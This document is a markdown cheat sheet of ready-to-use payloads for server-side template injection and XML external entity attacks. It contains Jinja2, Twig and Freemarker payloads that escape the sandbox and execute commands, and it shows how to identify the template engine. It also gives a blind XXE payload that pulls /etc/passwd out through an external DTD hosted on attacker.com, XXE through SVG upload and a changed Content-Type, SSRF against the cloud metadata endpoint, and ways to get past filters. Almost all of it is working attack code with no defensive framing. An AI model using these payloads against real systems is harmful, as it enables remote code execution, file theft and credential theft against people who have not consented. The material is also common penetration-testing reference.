# SSTI & XXE Advanced Techniques

## SSTI Advanced Payloads

### Jinja2 Sandbox Escape
```python
# Find builtins via MRO
{{''.__class__.__mro__[1].__subclasses__()}}
# Get index of <class 'os._wrap_close'>
# Then:
{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}
```

### Twig RCE (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

### Freemarker RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### Template Engine Identification
```
{{7*'7'}} = 49 → Twig
{{7*'7'}} = 7777777 → Jinja2
${7*7} = 49 → Freemarker
<%= 7*7 %> = 49 → ERB
#{7*7} = 49 → Pug/Jade
```

---

## XXE Advanced Techniques

### Blind XXE with External DTD
```xml
<!-- Payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root>&exfil;</root>

<!-- evil.dtd -->
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?%file;'>">
%all;
```

### XXE via SVG Upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XXE via Content-Type Change
```
POST /comment HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment><text>&xxe;</text></comment>
```

### XXE to SSRF
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<product><productId>&xxe;</productId></product>
```

### Bypass Filters
```xml
<!-- UTF-16 encoding -->
<!-- Base64 via PHP wrapper -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Double encoding -->
<!ENTITY xxe SYSTEM "file:///e%74c/passwd">
```
